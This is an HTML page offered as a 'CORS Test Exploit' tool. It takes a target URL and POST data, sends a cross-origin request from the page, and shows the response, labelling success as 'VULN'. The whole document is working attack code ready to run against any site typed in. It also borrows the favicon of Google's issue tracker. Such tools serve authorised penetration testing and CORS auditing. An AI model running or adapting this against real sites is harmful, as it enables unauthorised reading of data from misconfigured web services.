<!DOCTYPE html>
<html>
<head>
  <title>CORS Test Exploit</title>
  <!-- Credit to Eka Syahwan (http://ekasyahwan.com) -->
  <link rel="SHORTCUT ICON" href="https://issuetracker.google.com/img/favicon.ico">
  <link rel="stylesheet" href="https://bootswatch.com/4/lumen/bootstrap.css" media="screen">
</head>
<body>
<div class="container mt-4">
<div class="col-md-10 border mx-auto p-4">
<h3 class="text-center">CORS Test Exploit</h3>
URL: <br/><input type="text" name="target" size="140" autocomplete="off"
onkeypress="if(this.value.match(/document/)) this.value=this.value.replace(/\D/g,'')"
onkeyup   ="if(this.value.match(/document/)) this.value=this.value.replace(/\D/g,'')"
><br/>
Post Data: <br/><input type="text" name="postdata" size="140" autocomplete="off"
  onkeypress="if(this.value.match(/document/)) this.value=this.value.replace(/\D/g,'')"
  onkeyup   ="if(this.value.match(/document/)) this.value=this.value.replace(/\D/g,'')"
><br/> <br/>
<!-- Method GET / POST tinggal ganti onclick() -->
<button type="button" class="btn btn-info" type="submit" onclick="post()">Exploit Now!</button>
<pre id="result"></pre>
<script type="text/javascript">
  function post() {
    var url   = document.getElementsByName("target")[0].value;
    var data   = document.getElementsByName("postdata")[0].value;
    var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
              document.getElementById("result").innerHTML = '<br/><br/><pre>URL: '+url+'<br/>Response (Status : <kbd>VULN</kbd> | status code : <kbd>'+this.status+'</kbd>):<br><br><textarea style="margin: 0px; width: 880px; height: 436px;"">'+this.responseText+'</textarea></pre>'
        }else{
            document.getElementById("result").innerHTML = "<br/><br/><pre>URL: "+url+"<br/>Respons (status : <kbd>Not Vuln</kbd>) : response tidak ada , status code <kbd>"+this.status+"</kbd></pre>";
        }
        };
      xhttp.open("POST", url, true);
      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      xhttp.send(data);
  }
</script>
</div>
</div>
</body>
</html>
